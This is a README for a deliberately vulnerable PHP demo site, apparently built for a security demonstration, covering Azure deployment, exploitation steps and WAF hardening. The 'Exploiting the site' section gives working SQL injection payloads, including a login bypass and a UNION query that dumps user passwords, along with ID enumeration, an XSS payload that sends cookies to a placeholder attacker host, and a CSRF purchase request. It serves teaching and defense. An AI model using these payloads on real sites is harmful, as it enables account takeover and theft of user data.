# hackmesite
PHP site ready to be hacked. Used in CSE demo on 2019-02-11.

# Deploy
- Deploy Web App In Azure. Here's a [sample template](https://github.com/Azure/azure-quickstart-templates/tree/master/101-webapp-basic-linux)
- Enable [In-App MySQL](https://blogs.msdn.microsoft.com/appserviceteam/2017/03/06/announcing-general-availability-for-mysql-in-app/)
- Import the `localdb.sql` content to MySQL using `sitename.scm.azurewebsites.net/phpmyadmin`
- Pull the connection data by viewing the `MYSQLCONNSTR_localdb` environment variable (see commented line in `db.php`), or using FTP go to `/data/mysql/MYSQLCONNSTR_localdb.ini` and take note of the port, username and password to connect to the DB
- Edit `db.php` and populate the fields for connecting to the DB


# Exploiting the site
1. SQL Injection on `index.php`: Login with any username and `" or ""="` as the password and you'll sign in as UID #1 (a password of `" OR "1"="1` also works but is more prone to being detected)
2. Enumeration on `main.php`: Once signed-in, change the query string to use another `cid`, such as `?cid=2`
3. SQL Injection on `main.php`: Once signed-in, add SQL to the `cid` parameter to expose the contents of the `users` table: `?cid=1 UNION SELECT users.cusername AS oid, users.cpassword AS timestamp, orders.cid, orders.pid,users.*, products.* FROM orders, users, products WHERE products.pid=orders.pid AND users.cid=orders.cid`
4. XSS in `main.php`: Enter into the search bar `ponies<script src="https://YOURHOST.azurewebsites.net/malicious/collector.js"></script>`
    - You'll find the stolen cookie at `https://YOURHOST.azurewebsites.net/malicious/crumbs.log` (the logger is the `/malicious/cookie_monster.php` file) which you can decode at [jwt.ms](https://jwt.ms)
5. CSRF in `main.php`: Enter into the search bar `ponies<script src="/api.php?action=purchase&cid=2&pid=1"></script>`
    - You will find that cid 2 (user `neill`) has made a new purchase in the background

# Securing it
Put the site behind a Application Gateway+WAF, configure the WAF in prevention mode and set its diagnostic logs to route to a Log Analytics Workspace.

Try the attacks again and you should see a 403. Within ~5 minutes a log entry for the event appears in Log Analytics.

Log Analytics queries:
- Count of attacks, grouped by attacker IP address: `AzureDiagnostics | where OperationName == "ApplicationGatewayFirewall" | summarize count() by clientIp_s`
- Detailed list of SQLi or XSS attacks: `AzureDiagnostics | where OperationName == "ApplicationGatewayFirewall" and ruleSetType_s == "OWASP" and ruleId_s in ("941100", "941110", "942130", "949110")`
